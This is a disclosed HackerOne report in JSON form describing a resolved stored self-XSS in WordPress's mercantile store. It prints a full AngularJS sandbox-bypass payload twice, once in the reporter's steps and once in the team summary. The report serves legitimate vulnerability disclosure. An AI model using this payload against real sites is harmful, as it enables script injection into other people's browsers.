{
  "id": 222224,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjIyMjQ=",
  "url": "https://hackerone.com/reports/222224",
  "title": "Stored but [SELF] XSS in mercantile.wordpress.org",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2017-04-19T18:48:08.590Z",
  "submitted_at": "2017-04-19T18:48:08.590Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "codertom",
    "url": "/codertom",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/207/ec28f41eb08bfd4c3b5bc6053eeefb6703f2cc2a_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 55,
    "url": "https://hackerone.com/wordpress",
    "handle": "wordpress",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "WordPress",
      "twitter_handle": "wordpress",
      "website": "https://wordpress.org/",
      "about": "Beautiful sites of any kind."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-05-26T18:46:44.901Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2017-04-26T18:46:42.712Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Wordpress and to Iandunn\n\n   This was what I am talking about lately so I will go up straight on how to reproduce it.\n\n###Steps to Reproduce\n1. Go to mercantile.wordpress.org //make sure to have an account for this test :D \n2. Hover on *Account Details* `/my-account/edit-account/` \n3. In `First Name` and `Last Name` copy and paste this payload: \n`{{\n    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;\n    c.$apply=$apply;c.$eval=b;op=$root.$$phase;\n    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\n    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\n    B=C(b,c,b);$evalAsync(\"\n    astNode=pop();astNode.type='UnaryExpression';\n    astNode.operator='(window.X?void0:(window.X=true,$location.path('http://example.com/)))+';\n    astNode.argument={type:'Identifier',name:'foo'};\n    \");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n}}` after that save it\n4. After saving it refresh the browser and the xss will trigger with the domain in it.\n\n Upon registration of accounts it restricts symbols for the fields in `First Name` and `Last Name` but after being registered we can easily edit it here to inject some good payloads\n\nKind Regards,\nTom\n",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-05-26T18:46:42.763Z",
  "allow_singular_disclosure_after": -212003593.9536158,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "r3y",
    "eveeez",
    "zerotoone",
    "japz",
    "sumit7",
    "codertom",
    "0xm1racle",
    "spetr0x"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 4202,
      "category": "team",
      "content": "### Steps to Reproduce\n\n1. Open Chrome and go to mercantile.wordpress.org, sign up for an account\n1. Browse to `/my-account/edit-account/`\n1. Paste the payload below into the fields and save\n1. Refresh the browser and the XSS will trigger an alert with the domain in it.\n\n```\n{{\nc=''.sub.call;b=''.sub.bind;a=''.sub.apply;\nc.$apply=$apply;c.$eval=b;op=$root.$$phase;\n$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\nC=c.$apply(c);$root.$$phase=op;$root.$digest=od;\nB=C(b,c,b);$evalAsync(\"\nastNode=pop();astNode.type='UnaryExpression';\nastNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';\nastNode.argument={type:'Identifier',name:'foo'};\n\");\nm1=B($$asyncQueue.pop().expression,null,$root);\nm2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n$eval('a(b.c)');[].push.apply=a;\n}}\n```",
      "user": {
        "id": 2974,
        "username": "iandunn",
        "name": "Ian Dunn",
        "bio": "I'm a WordPress plugin developer.",
        "cleared": false,
        "verified": false,
        "website": "https://iandunn.name",
        "location": "Seattle, WA",
        "created_at": "2014-02-21T21:19:52.171Z",
        "url": "https://hackerone.com/iandunn",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 4191,
      "category": "researcher",
      "content": "Stored XSS in their swag store using angular JS sanbox bypass, a big thanks to Portswigger blog",
      "user": {
        "id": 16207,
        "username": "codertom",
        "name": "tom",
        "bio": "twitter.com/timzaverin",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "Philippines",
        "created_at": "2015-01-11T10:17:56.709Z",
        "url": "https://hackerone.com/codertom",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/207/ec28f41eb08bfd4c3b5bc6053eeefb6703f2cc2a_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/207/ec28f41eb08bfd4c3b5bc6053eeefb6703f2cc2a_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/016/207/ec28f41eb08bfd4c3b5bc6053eeefb6703f2cc2a_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
